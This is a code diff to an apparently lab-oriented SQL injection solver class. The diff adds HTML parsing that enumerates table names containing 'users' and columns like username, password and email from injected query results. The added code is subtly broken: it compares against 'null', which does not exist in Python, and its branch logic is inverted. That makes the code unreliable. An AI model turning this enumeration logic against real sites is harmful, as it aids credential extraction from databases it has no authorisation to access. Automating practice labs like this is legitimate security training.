@@ -149,6 +149,13 @@ class SQLInjectionBaseSolver(ABC):
                 self.table_name = td.text
                 self.console.log(f"[bold blue]Table Name:[/bold blue] {self.table_name}")
                 return
+        th_html = self.soup_html.find_all('th')
+        for th in th_html:
+            if 'users' in th.text or th.text.startswith('USERS'):
+                self.spinner.stop()
+                self.table_name = th.text
+                self.console.log(f"[bold blue]Table Name:[/bold blue] {self.table_name}")
+                return
 
     def retrieve_column_name(self):
         """Retrieve the column name."""
@@ -162,9 +169,15 @@ class SQLInjectionBaseSolver(ABC):
         url_brute = self.url + self.categories_url[1] + payload
         self._request_lab('GET', url_brute)
         td_html = self.soup_html.find_all('td')
-        for td in td_html:
-            if 'username' in td.text or 'USERNAME' in td.text or 'password' in td.text or 'PASSWORD' in td.text or 'email' in td.text or 'EMAIL' in td.text:
-                self.column_name.append(td.text)
+        th_html = self.soup_html.find_all('th')
+        if td_html == null:
+            for td in td_html:
+                if 'username' in td.text or 'USERNAME' in td.text or 'password' in td.text or 'PASSWORD' in td.text or 'email' in td.text or 'EMAIL' in td.text:
+                    self.column_name.append(td.text)
+        else:
+            for th in th_html:
+                if 'username' in th.text or 'USERNAME' in th.text or 'password' in th.text or 'PASSWORD' in th.text or 'email' in th.text or 'EMAIL' in th.text:
+                    self.column_name.append(th.text)
         self.spinner.stop()
         self._print_table(f"\nColumns of {self.table_name}", ["Column Name"], zip(self.column_name))
         
